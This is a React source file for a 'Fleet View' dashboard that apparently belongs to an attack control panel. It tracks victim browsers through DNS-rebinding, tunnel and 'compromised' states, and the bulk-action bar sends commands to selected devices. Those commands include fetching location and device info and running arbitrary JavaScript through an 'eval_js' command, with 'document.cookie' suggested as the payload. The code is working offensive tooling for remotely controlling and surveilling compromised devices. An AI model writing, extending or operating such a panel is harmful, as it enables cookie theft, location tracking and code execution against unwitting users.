import React, { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { apiFetch, sendCommand, parseUTC } from '../api/client.js';
import { C, S, Icon } from '../theme.jsx';

// helpers

function relativeTime(ts) {
  if (!ts) return 'never';
  const diff = Date.now() - parseUTC(ts).getTime();
  if (diff < 60_000) return `${Math.floor(diff / 1000)}s ago`;
  if (diff < 3_600_000) return `${Math.floor(diff / 60_000)}m ago`;
  if (diff < 86_400_000) return `${Math.floor(diff / 3_600_000)}h ago`;
  return `${Math.floor(diff / 86_400_000)}d ago`;
}

function isActiveLastDay(ts) {
  if (!ts) return false;
  return Date.now() - parseUTC(ts).getTime() < 86_400_000;
}

function deriveAttackState(events) {
  if (!events || events.length === 0) return 'idle';
  const types = events.map(e => e.type || e.event_type || '');
  if (types.some(t => t === 'compromised' || t.includes('exfil'))) return 'compromised';
  if (types.some(t => t === 'tunnel_ready' || t.includes('tunnel'))) return 'tunnel_up';
  if (types.some(t => t.includes('rebind') || t.includes('dns'))) return 'rebind_active';
  return 'idle';
}

function hasTunnelRecently(events) {
  if (!events || events.length === 0) return false;
  const TWO_MIN = 2 * 60 * 1000;
  return events.some(e => {
    const t = e.type || e.event_type || '';
    if (!t.includes('tunnel')) return false;
    const ts = e.created_at || e.timestamp;
    return ts && Date.now() - parseUTC(ts).getTime() < TWO_MIN;
  });
}

const STATE_META = {
  idle:          { label: 'Idle',          color: C.text2,  bg: 'rgba(255,255,255,0.04)', border: 'rgba(255,255,255,0.09)' },
  rebind_active: { label: 'Rebind Active', color: C.amber,  bg: C.amberBg,               border: 'rgba(245,158,11,0.25)' },
  tunnel_up:     { label: 'Tunnel Up',     color: C.accent, bg: C.accentBg,              border: 'rgba(59,130,246,0.25)' },
  compromised:   { label: 'Compromised',   color: C.red,    bg: C.redBg,                 border: 'rgba(239,68,68,0.25)' },
};

const BULK_COMMANDS = [
  { label: 'Ping',            type: 'ping',            payload: {} },
  { label: 'Get Location',    type: 'get_location',    payload: {} },
  { label: 'Get Device Info', type: 'get_device_info', payload: {} },
  { label: 'Custom JS...',    type: '__custom__',      payload: {} },
];

const SORT_OPTIONS = [
  { label: 'Last Seen',    key: 'last_seen' },
  { label: 'Attack State', key: 'attack_state' },
  { label: 'Device ID',    key: 'id' },
];

const STATE_ORDER = { compromised: 0, tunnel_up: 1, rebind_active: 2, idle: 3 };

// sub-components

function AttackBadge({ state }) {
  const meta = STATE_META[state] || STATE_META.idle;
  return (
    <span style={{
      padding: '2px 8px',
      borderRadius: 5,
      fontSize: 10,
      fontWeight: 700,
      letterSpacing: '0.07em',
      textTransform: 'uppercase',
      color: meta.color,
      background: meta.bg,
      border: `1px solid ${meta.border}`,
    }}>
      {meta.label}
    </span>
  );
}

function TunnelDot({ active }) {
  return active ? (
    <span title="Tunnel active" style={{
      display: 'inline-block',
      width: 6,
      height: 6,
      borderRadius: '50%',
      background: C.green,
      animation: 'pulseDot 2s ease-in-out infinite',
      marginLeft: 6,
      flexShrink: 0,
    }} />
  ) : null;
}

function StatCard({ label, value, color }) {
  return (
    <div style={{
      background: C.surface3,
      border: `1px solid ${C.border}`,
      borderRadius: 8,
      padding: '14px 16px',
      flex: 1,
      minWidth: 120,
    }}>
      <div style={{ fontFamily: C.mono, fontSize: 24, fontWeight: 700, color }}>{value}</div>
      <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: '0.08em', textTransform: 'uppercase', color: C.text2, marginTop: 4 }}>{label}</div>
    </div>
  );
}

// main component

export default function FleetView() {
  const navigate = useNavigate();

  const [devices, setDevices]           = useState([]);
  const [deviceEvents, setDeviceEvents] = useState({});
  const [loading, setLoading]           = useState(true);
  const [search, setSearch]             = useState('');
  const [sortKey, setSortKey]           = useState('last_seen');
  const [filterState, setFilterState]   = useState('all');
  const [selected, setSelected]         = useState(new Set());
  const [bulkCmd, setBulkCmd]           = useState(BULK_COMMANDS[0]);
  const [customJs, setCustomJs]         = useState('');
  const [sending, setSending]           = useState(false);
  const [sendResult, setSendResult]     = useState(null);

  // data loading

  const loadDevices = useCallback(async () => {
    try {
      const data = await apiFetch('/api/devices/');
      setDevices(data);
      const eventsMap = {};
      await Promise.allSettled(
        data.map(async d => {
          try {
            const ev = await apiFetch(`/api/devices/${d.id}/events?limit=5`);
            eventsMap[d.id] = Array.isArray(ev) ? ev : (ev.events ?? []);
          } catch {
            eventsMap[d.id] = [];
          }
        })
      );
      setDeviceEvents(eventsMap);
    } catch {
      // auth redirect handled by apiFetch
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadDevices();
    const timer = setInterval(loadDevices, 5_000);
    return () => clearInterval(timer);
  }, [loadDevices]);

  // derived state

  const enriched = devices.map(d => {
    const events = deviceEvents[d.id] ?? [];
    const attackState = deriveAttackState(events);
    const tunnelActive = hasTunnelRecently(events);
    return { ...d, attackState, tunnelActive };
  });

  const stats = {
    total:       enriched.length,
    activeDay:   enriched.filter(d => isActiveLastDay(d.last_seen)).length,
    tunnelsUp:   enriched.filter(d => d.tunnelActive).length,
    compromised: enriched.filter(d => d.attackState === 'compromised').length,
  };

  const filtered = enriched
    .filter(d => {
      if (filterState !== 'all' && d.attackState !== filterState) return false;
      if (search) {
        const q = search.toLowerCase();
        return (
          d.id?.toLowerCase().includes(q) ||
          d.name?.toLowerCase().includes(q) ||
          d.user_agent?.toLowerCase().includes(q)
        );
      }
      return true;
    })
    .sort((a, b) => {
      if (sortKey === 'last_seen') {
        const ta = a.last_seen ? parseUTC(a.last_seen).getTime() : 0;
        const tb = b.last_seen ? parseUTC(b.last_seen).getTime() : 0;
        return tb - ta;
      }
      if (sortKey === 'attack_state') {
        return (STATE_ORDER[a.attackState] ?? 9) - (STATE_ORDER[b.attackState] ?? 9);
      }
      return (a.id ?? '').localeCompare(b.id ?? '');
    });

  const allFilteredIds = filtered.map(d => d.id);
  const allSelected = allFilteredIds.length > 0 && allFilteredIds.every(id => selected.has(id));

  // selection handlers

  function toggleDevice(id, e) {
    e.stopPropagation();
    setSelected(prev => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });
  }

  function toggleAll() {
    if (allSelected) {
      setSelected(prev => {
        const next = new Set(prev);
        allFilteredIds.forEach(id => next.delete(id));
        return next;
      });
    } else {
      setSelected(prev => {
        const next = new Set(prev);
        allFilteredIds.forEach(id => next.add(id));
        return next;
      });
    }
  }

  function clearSelection() {
    setSelected(new Set());
  }

  // bulk send

  async function handleBulkSend() {
    const targets = [...selected];
    if (!targets.length) return;

    let type = bulkCmd.type;
    let payload = bulkCmd.payload;

    if (type === '__custom__') {
      const js = customJs.trim();
      if (!js) { alert('Enter custom JS payload first.'); return; }
      type = 'eval_js';
      payload = { code: js };
    }

    setSending(true);
    setSendResult(null);

    const results = await Promise.allSettled(
      targets.map(id => sendCommand(id, type, payload))
    );

    const ok   = results.filter(r => r.status === 'fulfilled').length;
    const fail = results.filter(r => r.status === 'rejected').length;
    setSendResult({ ok, fail });
    setSending(false);
    setTimeout(() => setSendResult(null), 4000);
  }

  // render

  const uaSnippet = ua => {
    if (!ua) return '-';
    const m = ua.match(/(iPhone|iPad|Android|Windows|Mac|Linux|CrOS)[^;)]*/);
    return m ? m[0].trim() : ua.slice(0, 40);
  };

  const divider = <div style={{ width: 1, height: 16, background: C.border, flexShrink: 0 }} />;

  return (
    <motion.div
      initial={{ opacity: 0, y: 6 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.15 }}
    >
      {/* header */}
      <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 24 }}>
        <div>
          <h1 style={{ fontSize: 20, fontWeight: 700, margin: 0, color: C.text }}>Fleet View</h1>
          <div style={{ fontSize: 12, color: C.text2, marginTop: 2 }}>
            {enriched.length} devices registered, auto-refresh every 5s
          </div>
        </div>
        <input
          value={search}
          onChange={e => setSearch(e.target.value)}
          placeholder="Search device ID / UA..."
          style={{ ...S.input, width: 220 }}
        />
      </div>

      {/* stats bar */}
      <div style={{ display: 'flex', gap: 12, marginBottom: 24, flexWrap: 'wrap' }}>
        <StatCard label="Total Devices"   value={stats.total}       color={C.accent} />
        <StatCard label="Active Last 24h" value={stats.activeDay}   color={C.green} />
        <StatCard label="Tunnels Up"      value={stats.tunnelsUp}   color={C.accent} />
        <StatCard label="Compromised"     value={stats.compromised} color={C.red} />
      </div>

      {/* bulk actions bar */}
      <AnimatePresence>
        {selected.size > 0 && (
          <motion.div
            initial={{ opacity: 0, y: -8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -8 }}
            transition={{ duration: 0.15 }}
            style={{
              background: C.surface,
              border: `1px solid ${C.borderMd}`,
              borderRadius: 8,
              padding: '10px 14px',
              marginBottom: 16,
              display: 'flex',
              alignItems: 'center',
              gap: 10,
              flexWrap: 'wrap',
            }}
          >
            <span style={{ fontSize: 12, fontWeight: 700, letterSpacing: '0.07em', color: C.text2, whiteSpace: 'nowrap' }}>
              {selected.size} SELECTED
            </span>

            <select
              value={bulkCmd.type}
              onChange={e => setBulkCmd(BULK_COMMANDS.find(c => c.type === e.target.value) || BULK_COMMANDS[0])}
              style={{
                ...S.input,
                width: 'auto',
                padding: '5px 8px',
                fontSize: 12,
                cursor: 'pointer',
              }}
            >
              {BULK_COMMANDS.map(c => (
                <option key={c.type} value={c.type}>{c.label}</option>
              ))}
            </select>

            {bulkCmd.type === '__custom__' && (
              <input
                value={customJs}
                onChange={e => setCustomJs(e.target.value)}
                placeholder="document.cookie"
                style={{
                  ...S.input,
                  flex: 1,
                  minWidth: 200,
                  fontFamily: C.mono,
                  fontSize: 12,
                }}
              />
            )}

            <button
              onClick={handleBulkSend}
              disabled={sending}
              style={S.btn('primary', sending)}
            >
              {sending ? 'Sending...' : `Send to ${selected.size}`}
            </button>

            {sendResult && (
              <span style={{
                fontSize: 12,
                fontWeight: 600,
                color: sendResult.fail > 0 ? C.amber : C.green,
              }}>
                {sendResult.ok} ok{sendResult.fail > 0 ? ` / ${sendResult.fail} failed` : ''}
              </span>
            )}

            <button
              onClick={clearSelection}
              style={{ ...S.btn('ghost'), marginLeft: 'auto' }}
            >
              Clear
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* sort / filter toolbar */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 16, flexWrap: 'wrap' }}>
        <label style={{ display: 'flex', alignItems: 'center', gap: 6, cursor: 'pointer', fontSize: 12, color: C.text2 }}>
          <input
            type="checkbox"
            checked={allSelected}
            onChange={toggleAll}
            style={{ accentColor: C.accent, width: 13, height: 13 }}
          />
          Select all
        </label>

        {divider}

        <span style={S.label}>Sort</span>
        {SORT_OPTIONS.map(opt => (
          <button
            key={opt.key}
            onClick={() => setSortKey(opt.key)}
            style={{
              ...S.btn('ghost'),
              background: sortKey === opt.key ? C.accentBg : 'transparent',
              color: sortKey === opt.key ? C.accent : C.text2,
              borderColor: sortKey === opt.key ? 'rgba(59,130,246,0.25)' : 'transparent',
            }}
          >
            {opt.label}
          </button>
        ))}

        {divider}

        <span style={S.label}>State</span>
        {['all', 'idle', 'rebind_active', 'tunnel_up', 'compromised'].map(s => {
          const meta = STATE_META[s];
          const active = filterState === s;
          return (
            <button
              key={s}
              onClick={() => setFilterState(s)}
              style={{
                ...S.btn('ghost'),
                background: active ? (meta?.bg ?? C.accentBg) : 'transparent',
                color: active ? (meta?.color ?? C.accent) : C.text2,
                borderColor: active ? (meta?.border ?? 'rgba(59,130,246,0.25)') : 'transparent',
              }}
            >
              {s === 'all' ? 'All' : meta?.label ?? s}
            </button>
          );
        })}
      </div>

      {/* fleet grid */}
      {loading ? (
        <div style={{ textAlign: 'center', color: C.text2, padding: 60 }}>Loading fleet...</div>
      ) : filtered.length === 0 ? (
        <div style={{ textAlign: 'center', color: C.text2, padding: 60 }}>No devices match</div>
      ) : (
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))',
          gap: 12,
        }}>
          {filtered.map((d, i) => {
            const isSelected = selected.has(d.id);
            const stateMeta = STATE_META[d.attackState] || STATE_META.idle;

            let cardBorder = C.border;
            if (isSelected) cardBorder = 'rgba(59,130,246,0.4)';
            else if (d.attackState === 'compromised') cardBorder = 'rgba(239,68,68,0.3)';
            else if (d.attackState === 'tunnel_up')   cardBorder = 'rgba(59,130,246,0.2)';

            return (
              <motion.div
                key={d.id}
                initial={{ opacity: 0, y: 8 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: i * 0.025, duration: 0.2 }}
                onClick={() => navigate(`/devices/${d.id}`)}
                style={{
                  background: isSelected ? 'rgba(59,130,246,0.05)' : C.surface3,
                  borderRadius: 8,
                  border: `1px solid ${cardBorder}`,
                  padding: '14px 16px',
                  cursor: 'pointer',
                  transition: 'border-color 0.15s, background 0.15s',
                  position: 'relative',
                  userSelect: 'none',
                }}
                whileHover={{
                  borderColor: isSelected ? 'rgba(59,130,246,0.55)' : C.borderMd,
                  background: isSelected ? 'rgba(59,130,246,0.08)' : C.surface2,
                }}
              >
                {/* checkbox */}
                <div
                  onClick={e => toggleDevice(d.id, e)}
                  style={{ position: 'absolute', top: 12, right: 12 }}
                >
                  <input
                    type="checkbox"
                    checked={isSelected}
                    onChange={() => {}}
                    onClick={e => e.stopPropagation()}
                    style={{ accentColor: C.accent, width: 14, height: 14, cursor: 'pointer' }}
                  />
                </div>

                {/* device ID + tunnel dot */}
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: 6 }}>
                  <span style={{ fontFamily: C.mono, fontSize: 14, fontWeight: 700, color: C.text, letterSpacing: '0.03em' }}>
                    {String(d.id).slice(0, 8)}
                  </span>
                  <TunnelDot active={d.tunnelActive} />
                </div>

                {/* name */}
                {d.name && (
                  <div style={{ fontSize: 12, color: C.text2, marginBottom: 5 }}>{d.name}</div>
                )}

                {/* UA snippet */}
                <div style={{
                  fontSize: 11,
                  color: C.text3,
                  marginBottom: 12,
                  whiteSpace: 'nowrap',
                  overflow: 'hidden',
                  textOverflow: 'ellipsis',
                }}>
                  {uaSnippet(d.user_agent)}
                </div>

                {/* attack state + last seen */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <AttackBadge state={d.attackState} />
                  <span style={{ fontFamily: C.mono, fontSize: 11, color: C.text2 }}>
                    {relativeTime(d.last_seen)}
                  </span>
                </div>
              </motion.div>
            );
          })}
        </div>
      )}
    </motion.div>
  );
}
